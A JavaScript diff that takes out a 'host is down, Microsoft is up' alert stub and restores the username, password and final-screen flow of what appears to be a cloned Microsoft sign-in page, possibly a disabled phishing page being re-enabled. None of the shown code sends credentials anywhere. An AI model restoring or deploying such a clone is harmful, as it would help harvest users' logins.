@@ -10,12 +10,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const nxt = document.getElementById('btn_next');
 
     nxt.addEventListener('click', () => {
-        // Show host down message instead of validating
-        alert("This host is down, Microsoft is up. Please try contacting them.");
-        return;
-        
-        // The rest of the original code is commented out
-        /*
         //validate the form
         validate();
         if (unameVal) {
@@ -26,7 +20,6 @@ document.addEventListener('DOMContentLoaded', () => {
             })
             view = "pwd";
         }
-        */
     })
 
     //////sign in button
@@ -34,12 +27,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const sig = document.getElementById('btn_sig');
 
     sig.addEventListener('click', () => {
-        // Show host down message instead of validating
-        alert("This host is down, Microsoft is up. Please try contacting them.");
-        return;
-        
-        // The rest of the original code is commented out
-        /*
         //validate the form
         validate();
         if (pwdVal) {
@@ -47,7 +34,6 @@ document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('section_final').classList.remove('d-none');
             view = "final";
         }
-        */
     })
 
     function validate() {
@@ -115,15 +101,8 @@ document.addEventListener('DOMContentLoaded', () => {
     //final buttons
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', () => {
-            // Show host down message instead of closing
-            alert("This host is down, Microsoft is up. Please try contacting them.");
-            return;
-            
-            // The rest of the original code is commented out
-            /*
             //close the window
             window.open(location, '_self').close();
-            */
         })
     })
 })
